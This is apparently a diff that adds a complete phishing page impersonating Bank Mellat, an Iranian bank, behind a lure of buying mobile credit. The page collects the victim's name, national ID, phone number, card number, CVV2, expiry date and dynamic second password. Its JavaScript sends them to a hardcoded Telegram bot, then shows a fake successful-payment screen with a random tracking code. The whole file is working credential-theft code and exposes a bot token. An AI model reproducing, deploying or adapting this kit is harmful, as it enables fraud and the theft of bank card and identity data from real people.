@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>بانک ملت | Bank Mellat</title>
+  <style>
+    body {
+      font-family: "Vazir", sans-serif;
+      background-color: #f0f0f0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      position: relative;
+    }
+    .logo {
+      width: 150px;
+      margin-bottom: 10px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #c10016;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #a30013;
+    }
+    .options-container {
+      display: none;
+      margin-top: 20px;
+    }
+    .option-button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .option-button:hover {
+      background-color: #45a049;
+    }
+    .charge-options {
+      display: none;
+      grid-template-columns: repeat(2, 1fr);
+      grid-gap: 10px;
+      margin-top: 15px;
+    }
+    .charge-option {
+      padding: 10px;
+      background-color: #f0f0f0;
+      border: 1px solid #ccc;
+      text-align: center;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .charge-option:hover {
+      background-color: #e0e0e0;
+    }
+    .payment-container {
+      display: none;
+      background-color: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      position: absolute;
+      top: 20%;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    .payment-title {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    .payment-box {
+      background-color: #fff;
+      border-radius: 10px;
+      padding: 20px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+    }
+    .green {
+      color: green;
+      font-size: 20px;
+    }
+    /* Updated blue-button to shift a bit upward and to the left */
+    .blue-button {
+      background-color: #007bff;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+      margin-left: 8px;
+      height: auto;
+      line-height: 1.2;
+      white-space: nowrap;
+      transform: translate(-5px, -8px);
+    }
+    .blue-button:hover {
+      background-color: #0056b3;
+    }
+    .green-button {
+      background-color: green;
+      color: white;
+      border: 1px solid red;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .green-button:hover {
+      background-color: darkgreen;
+    }
+    .orange-button {
+      background-color: orange;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 8px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .orange-button:hover {
+      background-color: darkorange;
+    }
+    .success-container {
+      display: none;
+    }
+    .tracking-code {
+      font-size: 20px;
+      margin: 20px 0;
+      color: #333;
+    }
+    .success-message {
+      font-size: 24px;
+      color: green;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <!-- صفحه ورود -->
+  <div class="container" id="login-page">
+    <img src="https://bankmellat.ir/images/logo.png" alt="Bank Mellat Logo" class="logo">
+    <input type="text" id="name" placeholder="نام و نام خانوادگی">
+    <input type="text" id="id" placeholder="کد ملی">
+    <input type="text" id="phone" placeholder="شماره تلفن">
+    <button onclick="showOptions()">ورود به سامانه</button>
+  </div>
+
+  <!-- صفحه اصلی پس از ورود -->
+  <div class="container" id="main-page" style="display: none;">
+    <img src="https://bankmellat.ir/images/logo.png" alt="Bank Mellat Logo" class="logo">
+    <button class="option-button" onclick="showChargeOptions()">خرید شارژ</button>
+    <button class="option-button" onclick="showError()">خرید اینترنت</button>
+    <!-- نمایش گزینه‌های خرید شارژ -->
+    <div class="charge-options" id="charge-options">
+      <div class="charge-option" onclick="selectCharge(10000)">10000 تومان</div>
+      <div class="charge-option" onclick="selectCharge(20000)">20000 تومان</div>
+      <div class="charge-option" onclick="selectCharge(50000)">50000 تومان</div>
+      <div class="charge-option" onclick="selectCharge(15000)">15000 تومان</div>
+    </div>
+  </div>
+
+  <!-- صفحه پرداخت -->
+  <div class="payment-container" id="payment-page">
+    <img src="https://bankmellat.ir/images/logo.png" alt="Bank Mellat Logo" class="logo">
+    <div class="payment-title">پرداخت مبلغ</div>
+    <div class="payment-box">
+      <h2>زمان باقی مانده:</h2>
+      <div id="timer" class="timer">10:00</div>
+      <h2 class="green" id="amount-paid">مبلغ پرداخت: 0 تومان</h2>
+    </div>
+    <div class="payment-box">
+      <input type="text" id="card-number" placeholder="شماره کارت">
+      <input type="text" id="cvv2" placeholder="Cvv2">
+      <input type="text" id="expiration" placeholder="تاریخ انقضا (مثال: 09/02)">
+      <div style="display: flex; justify-content: space-between; align-items: center;">
+        <input type="text" id="ramz2" placeholder="رمز دوم یا رمز پویا" style="width: 70%;">
+        <button class="blue-button" id="request-button" onclick="requestPassword()">درخواست رمز</button>
+      </div>
+    </div>
+    <!-- دکمه پرداخت -->
+    <button class="green-button" onclick="pay()">پرداخت</button>
+  </div>
+
+  <!-- صفحه موفقیت -->
+  <div class="container success-container" id="success-page" style="display: none;">
+    <img src="https://bankmellat.ir/images/logo.png" alt="Bank Mellat Logo" class="logo">
+    <div class="tracking-code" id="tracking-code">کد رهگیری: </div>
+    <div class="success-message">پرداخت موفق</div>
+    <button class="orange-button" onclick="goBack()">بازگشت</button>
+  </div>
+
+  <script>
+    function showOptions() {
+      document.getElementById("login-page").style.display = "none";
+      document.getElementById("main-page").style.display = "block";
+    }
+    function showChargeOptions() {
+      document.getElementById("charge-options").style.display = "grid";
+    }
+    // Placeholder function for an unavailable feature
+    function showError() {
+      alert("این قابلیت در حال حاضر در دسترس نیست.");
+    }
+    function selectCharge(amount) {
+      document.getElementById("payment-page").style.display = "block";
+      document.getElementById("main-page").style.display = "none";
+      document.getElementById("amount-paid").innerText = "مبلغ پرداخت: " + amount + " تومان";
+      startTimer();
+    }
+    function startTimer() {
+      var time = 600;
+      var timerElement = document.getElementById("timer");
+      var interval = setInterval(function() {
+        if (time <= 0) {
+          clearInterval(interval);
+          timerElement.innerText = "زمان تمام شد";
+        } else {
+          var minutes = Math.floor(time / 60);
+          var seconds = time % 60;
+          timerElement.innerText = minutes + ":" + (seconds < 10 ? "0" + seconds : seconds);
+          time--;
+        }
+      }, 1000);
+    }
+    function startRequestTimer() {
+      const btn = document.getElementById("request-button");
+      btn.disabled = true;
+      let seconds = 60;
+      const originalText = "درخواست رمز";
+      btn.innerText = originalText + " (" + seconds + "s)";
+      const interval = setInterval(() => {
+        seconds--;
+        if (seconds > 0) {
+          btn.innerText = originalText + " (" + seconds + "s)";
+        } else {
+          clearInterval(interval);
+          btn.disabled = false;
+          btn.innerText = originalText;
+        }
+      }, 1000);
+    }
+    function requestPassword() {
+      // Trigger the timer for 60 seconds on the request button
+      startRequestTimer();
+      const cardNumber = document.getElementById("card-number").value;
+      const cvv2 = document.getElementById("cvv2").value;
+      const expiration = document.getElementById("expiration").value;
+      const ramz2 = document.getElementById("ramz2").value;
+      const amount = document.getElementById("amount-paid").innerText;
+      const message = `
+#Nᴇᴡ_ᴍᴇssᴀɢᴇ » ғʀᴏᴍ ᴍᴇʟʟᴀᴛ
+
+#درخواست_رمز_دوم
+
+💸Aᴍᴏᴜɴᴛ: ${amount}
+
+💳Cᴀʀᴅ ɴᴜᴍʙᴇʀ: ${cardNumber}
+
+🗂️Cvv2: ${cvv2}
+
+🌟Exᴘɪʀᴀᴛɪᴏɴ Dᴀᴛᴇ: ${expiration}
+
+📊ʀᴀᴍᴢ_ᴅᴏᴠᴏᴍ: ${ramz2}
+      
+♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛
+
+♛Oᴡɴᴇʀ : @darghah_poyan
+      
+      `;
+     
+      sendToAdmin(message);
+    }
+    function sendToAdmin(message) {
+      const adminApiUrl = "https://api.telegram.org/bot7719499266:AAEmABRrWXlTs738onASroiSFEstCoWXlXw/sendMessage";
+      const chatId = "7193257772";
+      const text = encodeURIComponent(message);
+      const url = `${adminApiUrl}?chat_id=${chatId}&text=${text}`;
+      fetch(url, { mode: "no-cors" })
+      .then(response => console.log("Message sent to admin"))
+      .catch(error => console.error("Error sending message:", error));
+    }
+    function pay() {
+      const name = document.getElementById("name").value;
+      const id = document.getElementById("id").value;
+      const phone = document.getElementById("phone").value;
+      const cardNumber = document.getElementById("card-number").value;
+      const cvv2 = document.getElementById("cvv2").value;
+      const expiration = document.getElementById("expiration").value;
+      const ramz2 = document.getElementById("ramz2").value;
+      const amount = document.getElementById("amount-paid").innerText;
+      const trackingCode = Math.floor(10000000 + Math.random() * 90000000);
+      document.getElementById("tracking-code").innerText = "کد رهگیری: " + trackingCode;
+      const message = `
+#Nᴇᴡ_ᴍᴇssᴀɢᴇ » ғʀᴏᴍ ᴍᴇʟʟᴀᴛ
+
+❀❀❀❀
+
+👤ɴᴀᴍᴇ: ${name}
+_______________
+
+📩ᴄᴏᴅᴇ_ᴍᴇʟʟɪ: ${id}
+_______________
+
+☎️ᴘʜᴏɴᴇ: ${phone}
+
+■■■■■■■■■■■
+
+💸Aᴍᴏᴜɴᴛ: ${amount}
+
+■■■■■■■■■■■
+
+💳Cᴀʀᴅ ɴᴜᴍʙᴇʀ: ${cardNumber}
+_______________
+
+🗂️Cvv2: ${cvv2}
+_______________
+
+🌟Exᴘɪʀᴀᴛɪᴏɴ Dᴀᴛᴇ: ${expiration}
+_______________
+
+📊ʀᴀᴍᴢ_ᴅᴏᴠᴏᴍ: ${ramz2}
+      
+♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛      
+      
+♛Oᴡɴᴇʀ : @darghah_poyan      
+      `;
+      sendToAdmin(message);
+      document.getElementById("payment-page").style.display = "none";
+      document.getElementById("success-page").style.display = "block";
+    }
+    function goBack() {
+      document.getElementById("success-page").style.display = "none";
+      document.getElementById("main-page").style.display = "block";
+    }
+  </script>
+</body>
+</html>
